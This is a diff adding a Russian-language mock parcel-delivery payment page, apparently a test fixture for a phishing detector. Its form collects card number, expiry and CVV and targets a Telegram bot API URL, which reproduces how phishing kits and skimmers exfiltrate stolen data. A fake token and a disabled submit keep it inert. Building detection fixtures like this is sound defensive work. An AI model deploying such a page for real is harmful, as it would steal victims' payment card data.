@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="ru">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Оплата доставки</title><link rel="stylesheet" href="page.css">
+<style>:root{--c:#0a7d4f}</style></head>
+<body>
+<div class="site"><div class="logo">П</div><b>ПочтаЭкспресс</b><span>учебная страница · все данные вымышлены</span></div>
+<main>
+<!-- Фишинговые наборы и веб-скиммеры отправляют украденные данные в Telegram-бота через его
+     программный интерфейс api.telegram.org/bot<токен>/… (Malwarebytes, 2020).
+     Токен здесь вымышлен; форма не отправляется — анализатор смотрит только на адрес. -->
+<div class="box"><span class="badge">Отправление RU-7731-0045</span>
+  <h1>Оплата доставки посылки</h1>
+  <p>Посылка ожидает отправки. Оплатите доставку.</p>
+  <div class="total"><span>Доставка</span><span>299 ₽</span></div></div>
+<form class="box" action="https://api.telegram.org/bot0000000000:EDUCATIONAL-EXAMPLE/sendMessage" method="post" onsubmit="return false">
+  <label for="cc">Номер карты</label><input id="cc" name="cardnumber" autocomplete="cc-number" inputmode="numeric" placeholder="0000 0000 0000 0000">
+  <div class="row"><div><label for="exp">Срок действия</label><input id="exp" name="exp" autocomplete="cc-exp" placeholder="ММ/ГГ"></div>
+  <div><label for="cvc">CVV/CVC</label><input id="cvc" name="cvc" autocomplete="cc-csc" placeholder="123"></div></div>
+  <button type="submit">Оплатить 299 ₽</button>
+</form>
+</main>
+</body>
+</html>
